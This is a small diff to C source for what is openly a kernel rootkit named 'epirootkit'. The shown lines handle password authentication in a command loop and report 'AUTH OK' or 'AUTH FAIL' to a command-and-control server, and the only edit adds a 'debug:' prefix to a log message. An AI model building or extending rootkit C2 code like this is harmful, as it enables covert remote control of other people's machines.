@@ -161,7 +161,7 @@ static int command_loop(void *data) {
                 pr_info("epirootkit: authenticated\n");
                 send_to_c2("AUTH OK\n", 8);
             } else {
-                pr_info("epirootkit: bad password\n");
+                pr_info("debug: epirootkit: bad password\n");
                 send_to_c2("AUTH FAIL\n", 10);
             }
             continue;
